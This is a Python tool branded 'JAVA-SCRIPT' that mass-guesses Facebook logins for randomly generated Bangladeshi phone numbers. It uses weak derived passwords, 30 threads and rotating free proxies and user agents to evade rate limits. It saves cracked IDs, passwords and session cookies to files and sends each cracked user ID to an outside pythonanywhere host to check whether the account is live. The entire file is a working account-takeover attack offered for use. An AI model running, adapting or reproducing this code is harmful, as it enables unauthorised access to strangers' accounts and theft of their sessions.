
#----------------------------> import -------------------------->>>>>
import requests,os,random,string,sys,re
from concurrent.futures import ThreadPoolExecutor as tred
#----------------------------> colour -------------------------->>>>>
A1="\x1b[38;5;46m";A2="\x1b[38;5;47m";loop=0
A3="\x1b[38;5;48m";A4="\x1b[38;5;48m";ok=0
def printx(a,b,c):print("%s[%s] %s"%(c,a,b))
def inputx(a,b):x = input(f"{b}[~] {a} : ");return x
#----------------------------> proxy -------------------------->>>>>
prox= requests.get('https://api.proxyscrape.com/'+'v3/'+'free-proxy-list'+'/get?request='+'displayproxies').text
open('.prox.txt','w').write(prox)
prox=open('.prox.txt','r').read().splitlines()
#----------------------------> ua*ua -------------------------->>>>>
remi= requests.get('https://raw.git'+'hubusercontent'+'.com/KGF-42'+'0/ua/main/k'+'gfua.txt').text
open('.ua.txt','w').write(remi)
ugen=open('.ua.txt','r').read().splitlines()
#----------------------------> linex -------------------------->>>>>
def linex():print("\033[0;34m--------------------------------------------")
#---------------------------> logo ------------------------->>>>>
JAVAet = f'''
{A1}     _____ _   _____      ________________  ______
{A1} __ / / _ | | / / _ |____/ __/ ___/  _/ _ \/_  __/
{A1}/ // / __ | |/ / __ /___/\ \/ /___/ // ___/ / /   
{A1}\___/_/ |_|___/_/ |_|  /___/\___/___/_/    /_/    
\033[0;34m--------------------------------------------
{A1}[~] DEVOLOPER  :  TANJID VAI
{A2}[~] TOOLS      :  PAID X RANDOM
\033[0;34m--------------------------------------------'''
#----------------------------> clear -------------------------->>>>>
def clear():os.system('clear');print(JAVAet)
#----------------------------> main -------------------------->>>>>
def __main__():
    clear();printx('1','RANDOM CLONE BANGLADESH',f"{A1}")
    printx('0','EXIT TERMINAL',f"{A2}")
    linex();xxff = inputx("SELECT ONE",f"{A1}")
    if xxff == "1":
        __rand__()
    else:__main__()
#----------------------------> string -------------------------->>>>>
def __rand__():
    clear();print(f"{A1}[~] EXAMPLE : 01710 01609 01819 ")
    linex();xxf = inputx("SELECT CODE",f"{A1}")
    clear();print(f"{A1}[~] EXAMPLE : 2000 5000 20000 ")
    linex();xxk = int(inputx("PUT LIMIT",f"{A1}"));user=[]
    for x in range(xxk):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with tred(max_workers=30) as novana:
        clear();print(f"{A1}[~] OPERATOR : {xxf} X LIMIT : {str(len(user))} ")
        print(f"{A2}[~] FOR BEST RESULT ON/OFF AIR MODE");linex()
        for love in user:
            ids = xxf+love
            passlist = [ids,ids[:6],love,'203040']
            novana.submit(___random___,ids,passlist)
    print(f"\n\033[0;34m--------------------------------------------\n{A1}[~] CREAKING HAS COMPLETED \n{A2}[~] TOTAL OK : %s"%(ok))
    linex();input(f"{A1} PRESS ENTER TO EXIT ")
#----------------------------> method -------------------------->>>>>
def ___random___(ids,passlist):
    global loop,ok
    abcd = "\x1b[0m";asbd=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
    sys.stdout.write('\r\x1b[0m[\x1b[38;5;46m~\x1b[0m]~%s[%sJAVA-XD%s]>~[%s%s%s]~<[%sOK:%s%s] '%(abcd,"\x1b[38;5;46m",abcd,asbd,loop,abcd,"\x1b[38;5;46m",ok,abcd));sys.stdout.flush()
    try:
       for pas in passlist:
           url = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&display=touch&locale=en_BD&pl_dbl=0&refsrc=deprecated&_rdr"
           ua = "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/QP1A.190711.020) Mozilla/5.0 (Linux; Android 11; SM-A105F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/3.0 SamsungBrowser/9.2 Chrome/110.001.119 Mobile Safari/537.36[FBAN/EMA;FB_IAB/Orca-Android;FBLC/ru_RU;FBAV/240.0.0.9.115;]"
           ___ua___ = random.choice(ugen)
           nip=random.choice(prox)
           proxs= {'http': 'socks4://'+nip}
           with requests.Session() as ses:
              ses.headers.update({'Host': 'mbasic.facebook.com','Connection': 'keep-alive','Cache-Control': 'max-age=0','dpr': '2.8375000953674316','viewport-width': '980','sec-ch-ua': 'Chromium;v=118, Android','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-prefers-color-scheme': 'light','Upgrade-Insecure-Requests': '1','User-Agent': ___ua___,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','dnt': '1','X-Requested-With': 'com.facebook.katana','Sec-Fetch-Site': 'none','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Referer': 'https://m.facebook.com/','Accept-Language': 'en-GB,en;q=0.9,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',})
              link = ses.get(url)
              koki =  (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
              koki+= "m_pixel_ratio=2.8375000953674316; ps_n=0; ps_l=0;locale=bn_IN; wl_cbv=v2%3Bclient_version%3A2448%3Btimestamp%3A1711417561; vpd=v1%3B461x381x2.8375000953674316; wd=381x712;"
              data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 'pass':pas, 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
              head = {'Host': 'mbasic.facebook.com','Connection': 'keep-alive','Content-Length': str(len(data)),'Cache-Control': 'max-age=0','dpr': '2.8375000953674316','viewport-width': '980','sec-ch-ua': 'Chromium;v=118, Android','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-prefers-color-scheme': 'light','Upgrade-Insecure-Requests': '1','Origin': 'https://mbasic.facebook.com','Content-Type': 'application/x-www-form-urlencoded','User-Agent': ___ua___,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','X-Requested-With': 'com.facebook.katana','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&display=touch&locale=en_BD&pl_dbl=0&refsrc=deprecated&_rdr','Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',}
           po = ses.post(f'https://mbasic.facebook.com/login/device-based/regular/login/?api_key=490105264797912&auth_token=c1f860ebff6dcbf204cf9afed7a79328&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&refsrc=deprecated&app_id=490105264797912&cancel=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&lwv=100&locale2=en_BD&refid=9',headers=head,data=data,cookies={'cookie': koki},proxies=proxs,allow_redirects=False)
           if "checkpoint" in po.cookies.get_dict().keys():
               ids = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
               #print("\r%s[JAVA-CP] %s | %s "%("\033[0;30m",ids,pas))
               open('/sdcard/java-CP.txt','a').write(ids+'|'+pas+'\n')
               break
           elif "c_user" in ses.cookies.get_dict().keys():
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                ids = re.findall('c_user=(.*);xs', cookie)[0]
                url = f"https://shishirx.pythonanywhere.com/lock?uid={ids}"
                reqx = requests.get(url).text
                if 'live' in reqx:
                    print("\r%s[JAVA-OK] %s | %s "%("\x1b[38;5;46m",ids,pas))
                    open('/sdcard/JAVA-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                    ok+=1
                    break
                else:break
           else:
              continue
       loop+=1
    except Exception as e:
       pass
__main__()
